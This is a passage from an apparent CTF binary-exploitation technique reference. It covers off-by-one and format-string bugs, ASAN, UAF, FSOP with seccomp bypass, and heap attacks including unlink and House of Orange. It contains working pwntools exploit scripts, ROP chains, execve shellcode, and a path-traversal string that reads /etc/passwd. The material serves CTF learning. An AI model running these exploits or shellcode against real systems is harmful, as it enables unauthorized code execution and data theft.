**Pattern (Idempotence):** Lambda calculus interpreter's `simplify_normal_order()` unconditionally sets function type to ABS (abstraction), even when it's a VAR (variable).

**Key insight:** VAR's unused bytes 16-23 get interpreted as body pointer. When `print_expression()` encounters type > 2, it dumps raw bytes as UNKNOWN_DATA — flag bytes interpreted as type value trigger the dump.

**General lesson:** Type confusion in interpreters occurs when type tags aren't validated before downcasting. Unused padding bytes in one variant become active fields in another.

---

## Off-by-One Index to Size Corruption (VuwCTF 2025)

**Pattern (Kiwiphone):** Index 0 writes to `entries[-1]`, overlapping a struct's `size` field.

**Exploit chain:**
1. Write to index 0 with crafted data to set `phonebook.size = 48` (normally 16)
2. `print_all` now dumps 48 entries, leaking stack canary, saved RBP, and libc return address
3. Calculate libc base from leaked return address
4. Write ROP chain into entries 17-22: `[canary] [rbp] [ret] [pop_rdi] [/bin/sh] [system]`
5. Exit with -1 to trigger return through ROP chain

**Format trick:** Phone format `+48 0 0-0` doubles as valid phone number AND size overwrite value.

---

## Double win() Call Pattern (VuwCTF 2025)

**Pattern (Tokaid):** `win()` has `if (attempts++ > 0)` check — first call increments from 0 (fails), second call succeeds.

**Payload:** Stack two return addresses: `b'A'*offset + p64(win) + p64(win)`

**PIE calculation:** When main address is leaked: `base = main_leak - main_offset; win = base + win_offset`.

---

## DNS Record Buffer Overflow

**Pattern (Do Not Strike The Clouds):** Many AAAA records overflow stack buffer in DNS response parser.

**Exploitation:**
1. Set up DNS server returning excessive AAAA records
2. Target binary queries DNS, copies records into fixed-size stack buffer
3. Many records overflow into return address
4. Overwrite with win function address

## ASAN Shadow Memory Exploitation

**Pattern (Asan-Bazar, Nullcon 2026):** Binary compiled with AddressSanitizer has format string + OOB write vulnerabilities.

**ASAN Shadow Byte Layout:**
| Shadow Value | Meaning |
|-------------|---------|
| `0x00` | Fully accessible (8 bytes) |
| `0x01-0x07` | Partially accessible (1-7 bytes) |
| `0xF1` | Stack left redzone |
| `0xF3` | Stack right redzone |
| `0xF5` | Stack use after return |

**Key Insight:** ASAN may use a "fake stack" (50% chance) — areas past the ASAN frame have shadow `0x00` on the real stack but different on the fake stack. Detect which by leaking the return address offset.

**Exploitation Pattern:**
```python
# 1. Leak PIE base via format string
payload = b'%8$p'  # Code pointer at known offset
pie_base = leaked - known_offset

# 2. Detect real vs fake stack
# Real stack: return address at known offset from format string buffer
# Check if leaked return address matches expected function offset
is_real_stack = (ret_addr - pie_base) == 0xdc052  # known offset

# 3. Calculate OOB write offset
# Format string buffer at stack offset N
# Target (return address) at stack offset M
# Distance in bytes = (M - N) * 8
# Map to ledger system: slot = distance // 16, sub_offset = distance % 16

# 4. Overwrite return address with win() via OOB ledger write
# Retry until real stack is used (~50% success rate per attempt)
```

**Single-Interaction Exploitation:** Combine leak + detect + exploit in one format string interaction. If fake stack detected, disconnect and retry.

## Format String with Encoding Constraints + RWX .fini_array Hijack

**Pattern (Encodinator, Nullcon 2026):** Input is base85-encoded into RWX memory at fixed address, then passed to `printf()`.

**Key insight:** Don't try libc-based exploitation. Instead, exploit the RWX mmap region directly:

1. **RWX region at fixed address** (e.g., `0x40000000`): Write shellcode here
2. **`.fini_array` hijack**: Overwrite `.fini_array[0]` to point to shellcode. When `main()` returns, `__libc_csu_fini` calls `fini_array` entries.
3. **Format string writes**: Use `%hn` to write 2 bytes at a time to `.fini_array`

**Argument numbering with base85:**
Base85 decoding changes payload length. The decoded prefix occupies P bytes on stack, so first appended pointer is at arg `6 + P/8`. Use convergence loop:

```python
arg_base = 20  # Initial guess
for _ in range(20):
    fmt = construct_format_string(writes, arg_base)
    # Pad to base85 group boundary (multiple of 5 encoded = 4 raw)
    while len(fmt) % 10 != 0:
        fmt += b"A"
    prefix = b85_decode(fmt)
    new_arg_base = 6 + (len(prefix) // 8)
    if new_arg_base == arg_base:
        break
    arg_base = new_arg_base
```

**Shellcode (19-byte execve):**
```nasm
push 0x3b          ; syscall number
pop rax
cdq                ; rdx = 0
movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
push rdx           ; null terminator
push rbx           ; "/bin//sh"
push rsp
pop rdi            ; rdi = pointer to "/bin//sh"
push rdx
pop rsi            ; rsi = NULL
syscall
```

**Why avoid libc:** Base85 encoding makes precise libc address calculations extremely difficult. The RWX region + .fini_array approach uses only fixed addresses (no ASLR, no PIE concerns for the write target).

## Custom Canary Preservation

**Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.

**Key technique:** Write the exact canary bytes at the correct offset during overflow:
```python
# Buffer: 64 bytes | Canary: "BIRD" (4 bytes) | Target: 1 byte
payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
```

**Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.

---

## Signed Integer Bypass (Negative Quantity)

**Pattern (PascalCTF 2026):** Menu program with `scanf("%d")` for quantity. Negative input makes `quantity * price` negative, bypassing `balance >= total_cost` check.

```python
# Select expensive item (e.g., flag drink costing 1B), enter quantity -1
# -1 * 1000000000 = -1000000000 → balance (100) >= -1000000000 ✓
p.sendline(b'10')  # flag item
p.sendline(b'-1')  # negative quantity
```

## Canary-Aware Partial Overflow

**Pattern (MyGit, PascalCTF 2026):** Buffer overflow where `valid` flag sits between buffer end and canary.

**Stack layout:**
- Buffer: `rbp-0x30` (48 bytes)
- Valid flag: `rbp-0x10` (offset 32 from buffer)
- Stack canary: `rbp-0x08` (offset 40 from buffer)

**Key technique:** Use `./` as no-op path padding to control input length precisely:
```text
././././././././././../../../../flag    (36 bytes)
```
- `./` segments normalize to current directory (no-op)
- Byte 32 must be non-zero to set `valid = true`
- Stay under byte 40 to avoid canary

**Exploit chain:**
1. `checkout ././././././././././../../../../flag` - reads `/flag` content as "current commit"
2. `branch create ././././././././././../../../../tmp/leaked` - writes commit (flag) to `/tmp/leaked`
3. `cat /tmp/leaked` - read the exfiltrated flag

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.

**Exploitation:**
1. Identify global array adjacent to filename pointer in memory
2. Overflow array bounds by injecting extra delimiters (commas in CSV)
3. Overflowed pointer lands on filename variable
4. Change filename to `flag.txt`, then trigger read operation

```python
# Edit last cell with comma-separated overflow
edit_cell("J10", "whatever,flag.txt")
save()   # CSV row now has 11 columns
load()   # Column 11 overwrites savefile pointer with ptr to "flag.txt"
load()   # Now reads flag.txt into spreadsheet
print_spreadsheet()  # Shows flag
```

## MD5 Preimage Gadget Construction

**Pattern (Hashchain, Nullcon 2026):** Server concatenates N MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.

**Core technique:** Each MD5 digest is 16 bytes. Use `eb 0c` (jmp +12) as first 2 bytes to skip the middle 12 bytes, landing on bytes 14-15 which become a 2-byte instruction:

```c
// Brute-force MD5 preimage with prefix eb0c and desired 2-byte suffix
for (uint64_t ctr = 0; ; ctr++) {
    sprintf(msg + prefix_len, "%016llx", ctr);
    MD5(msg, msg_len, digest);
    if (digest[0] == 0xEB && digest[1] == 0x0C) {
        uint16_t suffix = (digest[14] << 8) | digest[15];
        if (suffix == target_instruction)
            break;  // Found!
    }
}
```

**Building i386 syscall chains from 2-byte gadgets:**
- `31c0` = `xor eax, eax`
- `89e1` = `mov ecx, esp`
- `b220` = `mov dl, 0x20`
- `cd80` = `int 0x80`
- `40` + NOP = `inc eax`

**Hashchain v1 (JMP to NOP sled):** RWX buffer at `0x40000000` + NOP sled at `0x41000000`. Find MD5 preimage starting with `0xE9` (jmp rel32) that lands in the sled:
```python
# Brute-force: find input whose MD5 starts with E9 and offset lands in NOP sled
# Example: b"v" + b"G" * 86 → MD5 starts with e9 59 1f 2c → jmp 0x412c1f5e
```

**Hashchain v2 (3-hash chain):** Store MD5 digests at user-controlled offsets. Build instruction chain:
- **Offset 0 (jmp +2):** Find input whose MD5 starts with `EB 02` (e.g., `143874`)
- **Offset 4 (push win):** Find input whose MD5 starts with `68 XX XX XX` matching win() address bytes
- **Offset 8 (ret):** Find input whose MD5 byte[1] is `C3` (e.g., `5488` → `56 C3`)

**Pre-computation approach:** Build lookup table mapping MD5 4-byte prefixes to inputs. At runtime, parse win() address from server banner, look up matching push-hash input.

**Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.

## VM GC-Triggered UAF — Slab Reuse (EHAX 2026)

**Pattern (SarcAsm):** Custom stack-based VM with NEWBUF/SLICE/GC/BUILTIN opcodes. Slicing a buffer creates a shared reference to the same slab. When the slice is dropped and GC'd, it frees the shared slab even though the parent buffer is still alive.

**Vulnerability:** `free_data()` called on slice frees the underlying slab pointer that the parent buffer still references → UAF read/write through parent.

**Exploit chain:**
1. `NEWBUF 24` → allocates 32-byte slab (slab class matches function objects)
2. `READ 24` → fills buffer, sets length so SLICE bounds check passes
3. `SLICE 0,24` → alias to same slab
4. `DROP` + `GC` → frees the slab via slice's destructor
5. `BUILTIN 0` → allocates function object, reuses freed 32-byte slab (code pointer at offset +8)
6. `WRITEBUF 16,0` → sets parent buffer's length to 16 (no actual write, bypasses bounds)
7. `PRINTB` → leaks code pointer from UAF slab → compute PIE base
8. `READ 16` → overwrites code pointer with `win()` address
9. `CALL` → executes `win()` → `execve("/bin/sh")`

```python
from pwn import *
import struct

# ULEB128 encoding for VM immediates
def uleb128(val):
    result = b''
    while True:
        byte = val & 0x7f
        val >>= 7
        if val: byte |= 0x80
        result += bytes([byte])
        if not val: break
    return result

# Opcodes
NEWBUF, READ, SLICE, DROP, GC = b'\x20', b'\x21', b'\x22', b'\x04', b'\x60'
BUILTIN, CALL, GLOAD, GSTORE = b'\x40', b'\x41', b'\x30', b'\x31'
WRITEBUF, PRINTB, PUSH, HALT = b'\x25', b'\x23', b'\x01', b'\xff'

code = b''
code += NEWBUF + uleb128(24) + GSTORE + uleb128(0)  # buf A in slot 0
code += GLOAD + uleb128(0) + READ + uleb128(24)      # fill to set length
code += GLOAD + uleb128(0) + SLICE + uleb128(0) + uleb128(24)  # slice
code += DROP + GC                                      # free slab via slice
code += BUILTIN + uleb128(0) + GSTORE + uleb128(1)   # func F reuses slab
code += GLOAD + uleb128(0) + WRITEBUF + uleb128(16) + uleb128(0)  # set len=16
code += GLOAD + uleb128(0) + PRINTB                    # leak code ptr
code += GLOAD + uleb128(0) + READ + uleb128(16)       # overwrite code ptr
code += PUSH + b'\x00' + GLOAD + uleb128(1) + CALL + uleb128(1)  # call win
code += HALT

blob = struct.pack('<I', len(code)) + code
p = remote('target', 9999)
p.send(blob + b'A'*24)          # blob + dummy READ data
leak = p.recv(16, timeout=5)
code_ptr = struct.unpack('<Q', leak[:8])[0]
win_addr = (code_ptr - 0x31d0) + 0x3000  # PIE base + win offset
p.send(struct.pack('<Q', win_addr) + b'\x00'*8)
p.sendline(b'cat /flag*')
p.interactive()
```

**Key lessons:**
- **Slab allocator reuse:** Function objects and buffer data share the same slab size class → guaranteed UAF overlap
- **WRITEBUF length trick:** Setting length without writing data bypasses bounds checks but exposes UAF content
- **GC as trigger:** Explicit `GC` opcode forces immediate collection → deterministic UAF timing
- **General pattern:** In custom VMs, look for shared references (slices, views, aliases) where destruction of one frees resources still held by another

---

## Path Traversal Sanitizer Bypass

**Pattern (Galactic Archives):** Sanitizer skips character after finding banned char.

```python
# Sanitizer removes '.' and '/' but skips next char after match
# ../../etc/passwd -> bypass with doubled chars:
"....//....//etc//passwd"
# Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
```

**Flag via `/proc/self/fd/N`:**
- If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
- fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file

## FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)

**Pattern (The Revenge of Womp Womp):** Heap exploit (UAF) leading to FSOP chain, but seccomp blocks standard `open`/`read`/`write` or `execve`. Use alternative syscalls to read the flag.

**Exploit chain:**
1. **Leak libc** via `show()` on freed unsorted bin chunk (fd/bk pointers)
2. **UAF → unsafe unlink** to redirect pointer to `.bss` region
3. **Craft fake FILE** structure on heap with vtable pointing to `_IO_wfile_jumps`
4. **FSOP chain:** `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)`
5. **Stack pivot** via `mov rsp, rdx` gadget (rdx controllable from FILE struct)
6. **ROP chain** using seccomp-compatible syscalls

**Seccomp bypass with openat/mmap/write:**
```python
# When seccomp blocks open() and read(), use:
# openat(AT_FDCWD, "/flag", O_RDONLY)  - syscall 257
# mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0)  - syscall 9
# write(STDOUT, mapped_addr, 4096)  - syscall 1

from pwn import *

rop = ROP(libc)
# openat(AT_FDCWD=-100, "/flag", O_RDONLY=0)
rop.raw(pop_rdi)
rop.raw(-100 & 0xffffffffffffffff)  # AT_FDCWD
rop.raw(pop_rsi)
rop.raw(flag_str_addr)               # pointer to "/flag\x00"
rop.raw(pop_rdx_rbx)
rop.raw(0)                            # O_RDONLY
rop.raw(0)
rop.raw(libc.sym.openat)

# mmap(NULL, 4096, PROT_READ=1, MAP_PRIVATE=2, fd=3, 0)
rop.raw(pop_rdi)
rop.raw(0)                            # addr = NULL
rop.raw(pop_rsi)
rop.raw(0x1000)                       # length
rop.raw(pop_rdx_rbx)
rop.raw(1)                            # PROT_READ
rop.raw(0)
# r10 = MAP_PRIVATE (2), r8 = fd (3) - need gadgets for these
rop.raw(libc.sym.mmap)

# write(1, mapped_addr, 4096)
rop.raw(pop_rdi)
rop.raw(1)                            # stdout
rop.raw(pop_rsi)
rop.raw(mapped_addr)                  # mmap return value
rop.raw(pop_rdx_rbx)
rop.raw(0x1000)
rop.raw(0)
rop.raw(libc.sym.write)
```

**`mov rsp, rdx` stack pivot gadget:**
```python
# Common in libc — search with:
# ROPgadget --binary libc.so.6 | grep "mov rsp, rdx"
# or: one_gadget libc.so.6 (sometimes lists pivot gadgets)

# In FSOP context: rdx is controllable via _IO_wide_data fields
# Set _wide_data->_IO_buf_base to point to your ROP chain
# When _IO_WDOALLOCATE is called, rdx = _wide_data->_IO_buf_base
# Pivot: mov rsp, rdx → ROP chain runs
```

**Key insight:** "Stale size tracking" = the menu tracks object sizes but doesn't invalidate after free. This enables UAF because `show()`/`edit()` still use the old size to access freed memory. Always check if delete nullifies the size field in addition to the pointer.

**Seccomp alternative syscall quick reference:**
| Blocked | Alternative | Syscall # |
|---------|------------|-----------|
| `open` | `openat` | 257 |
| `open` | `openat2` | 437 |
| `read` | `mmap` + access | 9 |
| `read` | `pread64` | 17 |
| `read` | `readv` | 19 |
| `write` | `writev` | 20 |
| `write` | `sendfile` | 40 |

---

## Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)

**Pattern (common_offset):** Stack variables share storage due to compiler layout. Carry from arithmetic on one variable corrupts an adjacent variable, enabling OOB access.

**Vulnerability:** `index` (byte at `[rsp+0x49]`) and `offset` (word at `[rsp+0x48]`) share storage. Incrementing `offset` by 255 causes a carry that corrupts `index` from 3 to 4, producing out-of-bounds table access.

**Exploit chain:**
1. Set index=0, increment offset by 1 to establish baseline
2. Set index=3, increment offset by 255 → carry corrupts index to 4
3. OOB access on table retrieves saved RIP from stack frame
4. Overwrite RIP to trigger `read_stdin` again, landing on stack gadget
5. Two-stage ROP: leak `puts@GOT`, compute libc base, then `setcontext` for code execution

**Key insight:** When variables of different sizes are packed adjacent on the stack (e.g., byte immediately after word), arithmetic overflow on the smaller-address variable carries into the larger-address variable. This is subtle in disassembly — look for overlapping `[rsp+N]` accesses with different operand sizes.

**Detection:** In disassembly, check if two named variables share partially overlapping stack offsets. For example, a `word` at `rsp+0x48` and a `byte` at `rsp+0x49` — the high byte of the word IS the byte variable.

---

## 1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)

**Pattern (Echo):** Custom `read_stdin()` uses 8-bit loop counter that wraps around, writing 65 bytes to a 64-byte buffer, overflowing into an adjacent size variable.

**Progressive leak technique:**
1. Trigger 1-byte overflow to increase buffer size from 0x40 to 0x48
2. With enlarged buffer, read further on stack — leak canary and saved rbp
3. Increase size to 0x77 to leak main's libc return address from stack
4. Compute libc base from leaked return address offset
5. Craft final payload: restore canary, set fake rbp, overwrite RIP with one-gadget

**One-gadget constraint setup:**
```python
from pwn import *

# Stack layout: buffer[rbp-0x50], size[rbp-0x10], canary[rbp-0x08], rbp, ret
# One-gadget needs NULL at [rbp-0x78] and [rbp-0x60]
buf_addr = leaked_rbp - 0x50  # known from leak
fake_rbp = buf_addr + 0x78

payload = b"\x00" * 8          # [fake_rbp - 0x78] = NULL (constraint)
payload += b"A" * 16
payload += b"\x00" * 8          # [fake_rbp - 0x60] = NULL (constraint)
payload = payload.ljust(64, b"A")
payload += p64(0x48)            # preserve enlarged size
payload += p64(canary)          # restore canary
payload += p64(fake_rbp)        # fake rbp satisfying constraints
payload += p64(one_gadget)      # libc one-gadget
```

**Key insight:** 8-bit counters in read loops cause off-by-one when the buffer size equals the counter's range (64 → wraps after 64, writes byte 65). The 1-byte overflow into a size field creates a progressive information disclosure primitive: each round leaks more stack data, enabling a full exploit chain from a single-byte overflow.

---

See [advanced-exploits-2.md](advanced-exploits-2.md) for bytecode validator bypass, io_uring UAF with SQE injection, integer truncation bypass, GC null-reference cascading corruption, leakless libc via multi-fgets, signed/unsigned char underflow with TLS destructor hijack, custom shadow stack bypass, and signed int overflow with XSS-to-binary pwn bridge.

---

## House-of-Spirit via C++ Vtable Fudge (source: SekaiCTF 2025 learning-oop)

**Trigger:** C++ pwn with class hierarchy (Animal/Shape-style); heap alloc sizes cluster at 0x110/0x480/0x481; method dispatch via vtable pointer.
**Signals:** `operator new[]`, virtual method calls in disasm, multiple chunks with metadata-size tricks, no tcache/FSOP primitives on their own.
**Mechanic:** craft fake `malloc_chunk` header with size that matches the next legitimate allocation class; free it via the class destructor path. Next `new` returns your forged chunk — now an instance of the target class — whose vtable pointer you control. Vmethod dispatch on a faked object runs `[vtable+OFF]` gadgets; marshal `rdi`/`rax` through a destructor to pivot into ROP. Works when standalone HoS fails because size classes don't match but the object-sizeof does.
Source: [github.com/project-sekai-ctf/sekaictf-2025/tree/main/pwn/learning-oop](https://github.com/project-sekai-ctf/sekaictf-2025/tree/main/pwn/learning-oop).



---

<!-- Source: advanced.md -->

# CTF Pwn - Advanced Techniques

## Table of Contents
- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
- [Heap Exploitation](#heap-exploitation)
  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
- [JIT Compilation Exploits](#jit-compilation-exploits)
- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [ret2dlresolve](#ret2dlresolve)
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)

For 2024-2026 era techniques (House of Apple 2, House of Einherjar, musl meta-pointer), see [advanced-2.md](advanced-2.md).

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.

---

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback -> jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

### Heap Grooming via Application Operations (Codegate 2013)

**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.

**Technique:**
1. Create N entries with overflow payloads in author/title/content fields
2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
3. Selectively delete entries to create specific heap holes
4. Allocate new entries that land in freed chunks, overlapping with surviving metadata

```python
# Example: Codegate 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

---

## Classic Heap Unlink Attack (Crypto-Cat)

**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.

**How dlmalloc unlink works:**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**Exploit pattern:**
1. Allocate two adjacent chunks (A and B)
2. Overflow A's data into B's chunk header:
   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
   - Clear B's `PREV_INUSE` bit in `size` field
   - Craft fake `fd` and `bk` pointers in A's data area
3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.

**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

